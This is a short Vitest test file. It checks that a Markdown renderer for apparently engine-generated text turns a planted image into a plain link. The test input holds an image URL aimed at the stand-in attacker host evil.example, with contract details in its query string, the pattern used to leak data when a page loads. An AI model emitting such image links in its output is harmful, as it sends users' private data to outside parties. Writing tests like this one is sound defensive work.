import { describe, expect, test } from 'vitest';
import { markdownBlocks } from '../src/routing/liveBlocks.js';

describe('engine-written Markdown', () => {
  test('a planted image to another site reaches the page only as a link', async () => {
    const blocks = await markdownBlocks('Client moved to Adyen.\n\n![](https://evil.example/c?d=Adyen%20contract)');
    expect(blocks.map((b) => b.type)).toEqual(['paragraph', 'paragraph']);
    expect(JSON.stringify(blocks)).not.toContain('"type":"image"');
    expect(JSON.stringify(blocks[1]!.content)).toContain('https://evil.example/c?d=Adyen%20contract');
  });
});
